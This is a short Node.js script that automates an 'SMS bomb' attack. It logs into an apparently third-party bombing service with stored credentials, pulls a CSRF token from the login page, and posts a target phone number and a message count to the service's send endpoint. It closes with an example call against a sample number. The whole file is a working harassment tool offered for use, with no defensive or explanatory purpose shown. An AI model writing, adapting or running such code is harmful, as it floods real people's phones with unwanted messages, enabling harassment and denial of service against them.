const axios = require('axios').default;
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const cheerio = require('cheerio');
require('dotenv').config();

const email = process.env.EMAIL;
const password = process.env.PASSWORD;

const jar = new CookieJar();
const client = wrapper(axios.create({ jar }));

async function sendBomb(phone, amount) {
  try {
    // Get login page to extract CSRF token
    const loginPage = await client.get('https://pikachutools.my.id/user/login');
    const $ = cheerio.load(loginPage.data);
    const token = $('input[name="_token"]').val();

    // Login with CSRF token
    const loginRes = await client.post('https://pikachutools.my.id/user/login', {
      email,
      password,
      _token: token
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });

    console.log("✅ Login Success");

    // Send bomb
    const res = await client.post('https://pikachutools.my.id/send', {
      nomor: phone,
      jumlah: amount
    });

    if (res.data && res.data.status === true) {
      console.log(`✅ Bomb started to ${phone} with ${amount} requests.`);
    } else {
      console.log(`❌ Failed:`, res.data);
    }

  } catch (err) {
    console.error("❌ Error:", err.response?.data || err.message);
  }
}

// Example run
sendBomb("01712345678", 10);
